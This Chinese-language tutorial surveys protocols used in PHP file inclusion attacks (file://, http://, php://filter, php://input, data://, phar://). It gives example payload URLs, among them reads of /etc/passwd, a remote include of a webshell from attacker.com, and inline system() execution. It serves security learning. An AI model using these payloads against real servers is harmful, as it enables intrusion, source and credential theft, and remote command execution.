### 常用的协议有哪些

**本地文件包含（LFI）协议**

本地文件包含通常利用的是 Web 应用对用户输入的文件路径缺乏严格过滤，导致攻击者能够包含服务器上的任意文件

**1. `file://` 协议**

这是最基础、最常见的文件包含协议。它允许你直接引用本地文件系统中的文件

- **用途**：读取服务器上的任意文件，如 `/etc/passwd`（Linux）或 `C:\Windows\win.ini`（Windows）
- **示例**：`http://example.com/vuln.php?file=file:///etc/passwd`
- **特点**：如果 Web 应用没有对路径进行充分过滤，攻击者可以利用 `../` 来遍历目录，从而访问到 Web 根目录以外的敏感文件

**远程文件包含（RFI）协议**

远程文件包含通常出现在 PHP 中，当 `allow_url_include` 和 `allow_url_fopen` 配置都开启时，Web 应用可以包含远程服务器上的文件

**1. `http://` 或 `https://` 协议**

这是最常见的远程文件包含方式，攻击者可以利用它来包含一个位于自己服务器上的恶意文件，从而在目标服务器上执行代码

- **用途**：在 Web 服务器上执行远程主机上的脚本，通常用于获取Webshell
- **示例**：`http://example.com/vuln.php?file=http://attacker.com/shell.txt`
- **特点**：`shell.txt`文件内容通常是一段Webshell代码，如`<?php system($_GET['cmd']); ?>`

**攻击者利用的伪协议（Pseudo Protocols）**

这些协议不是为了包含文件而设计的，但攻击者可以利用它们来读取文件内容、执行代码或绕过 WAF

**1. `php://filter`**

这是一个非常强大的伪协议，它允许你对包含的文件内容进行过滤操作，比如编码或解码。最常见的用法是读取 PHP 文件的源码，因为源码中可能包含数据库凭证等敏感信息

- **用途**：读取本地文件的源码，绕过 Web 应用对 `php` 文件执行的限制
- **示例**：`http://example.com/vuln.php?file=php://filter/read=convert.base64-encode/resource=index.php`
- **特点**：通过 Base64 编码，即使服务器对 `.php` 文件进行了执行处理，我们也能以明文形式获取其源码

**2. `php://input`**

这个协议可以让我们直接从 POST 请求的请求体中读取数据，并作为文件内容进行执行。当文件包含漏洞的参数无法直接在 URL 中写入恶意代码时，这是一个非常有用的绕过方法

- **用途**：通过 POST 请求发送恶意代码并执行
- **示例**：在 POST 请求中，发送数据`<?php system($_GET['cmd']); ?>`，同时访问`http://example.com/vuln.php?file=php://input`
- **特点**：常用于绕过 WAF 对 URL 中特定字符串的检测

**3. `data://`**

这个协议可以让我们在 URL 中直接嵌入数据，并作为文件内容执行。这在某些情况下可以绕过一些过滤规则，因为它不依赖于外部文件

- **用途**：在 URL 中直接执行恶意代码
- **示例**：`http://example.com/vuln.php?file=data://text/plain,<?php%20system('id');%20?>`
- **特点**：如果 Web 应用对 URL 中的特殊字符进行过滤，这种方式可能会失效

**4. `phar://`**

这个协议常用于反序列化攻击，尤其是在 PHAR 归档文件中。攻击者可以创建一个恶意的 PHAR 文件，并在其中嵌入恶意代码或反序列化对象，当服务器通过文件包含加载这个文件时，就会触发反序列化操作

- **用途**：利用 PHP 反序列化漏洞，执行任意命令
- **示例**：`http://example.com/vuln.php?file=phar:///path/to/archive.phar`
- **特点**：这种攻击方式通常需要配合一个反序列化漏洞才能成功